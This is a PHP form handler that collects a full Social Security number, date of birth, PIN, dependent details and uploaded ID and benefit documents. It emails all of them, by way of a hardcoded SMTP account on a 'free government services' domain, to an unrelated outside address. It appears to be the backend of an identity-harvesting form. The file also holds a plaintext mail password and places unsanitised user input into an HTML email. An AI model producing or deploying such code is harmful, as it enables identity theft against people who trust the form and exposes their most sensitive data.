<?php
require __DIR__.'/PHPMailer/Exception.php';
require __DIR__.'/PHPMailer/PHPMailer.php';
require __DIR__.'/PHPMailer/SMTP.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Retrieve form data
$referral = $_POST['referral'];
$firstname = $_POST['firstname'];
$lastname = $_POST['lastname'];
$dob = $_POST['dob'];
$socialSecurity = $_POST['social-security'];
$email = $_POST['email'];
$phone = $_POST['phone'];
$address = $_POST['address'];
$zip = $_POST['zip'];
$pin = $_POST['pin'];
$idFileName = $_FILES['id-file']['name'];
$idFile = $_FILES['id-file']['tmp_name'];
$benefitFileName = $_FILES['benefit-file']['name'];
$benefitFile = $_FILES['benefit-file']['tmp_name'];
$wifi = (isset($_POST['wifi'])) ? $_POST['wifi'] : 'False';
$tablet = (isset($_POST['tablet'])) ? $_POST['tablet'] : 'False';
$healthcare = (isset($_POST['healthcare'])) ? $_POST['healthcare'] : 'False';
$utilities = (isset($_POST['utilities'])) ? $_POST['utilities'] : 'False';
$message = $_POST['message'];
$dependentName = $_POST['dependent-name'];
$dependentDob = $_POST['dependent-dob'];
$dependentLast4 = $_POST['dependent-last4'];
$signature = $_POST['signature'];
$terms = $_POST['terms'];

// Create a new PHPMailer instance
$mail = new PHPMailer(true);

// SMTP configuration
$mail->isSMTP();
$mail->Host = 'mail.freegovservices.com'; // Replace with your SMTP server
$mail->SMTPAuth = true;
$mail->Username = 'service@freegovservices.com'; // Replace with your email address
$mail->Password = 'QY)0izmMsXVA'; // Replace with your email password
$mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
$mail->Port = 465;
$mail->IsHTML(true); 

// Sender and recipient settings
$mail->setFrom($email, $firstname); // Replace with your email and name
$mail->addAddress('contact@ivyhero.org', 'Johnr Gaetano'); // Replace with recipient email and name


// Email content
$mail->isHTML(true);
$mail->Subject = 'Application Form';
$mail->Body = "
    Referral: $referral<br>
    First Name: $firstname<br>
    Last Name: $lastname<br>
    Date of Birth: $dob<br>
    Social Security: $socialSecurity<br>
    Email: $email<br>
    Phone: $phone<br>
    Address: $address<br>
    ZIP: $zip<br>
    PIN: $pin<br>
    WiFi: $wifi<br>
    Tablet: $tablet<br>
    Healthcare: $healthcare<br>
    Utilities: $utilities<br>
    Message: $message<br>
    Dependent Name: $dependentName<br>
    Dependent DOB: $dependentDob<br>
    Dependent Last 4: $dependentLast4<br>
    Signature: $signature<br>
    Terms: $terms<br>
";

// Attach files
$mail->addAttachment($idFile, $idFileName);
$mail->addAttachment($benefitFile, $benefitFileName);

// Send the email
echo ($mail->send()) ? 'success' : 'error';
?>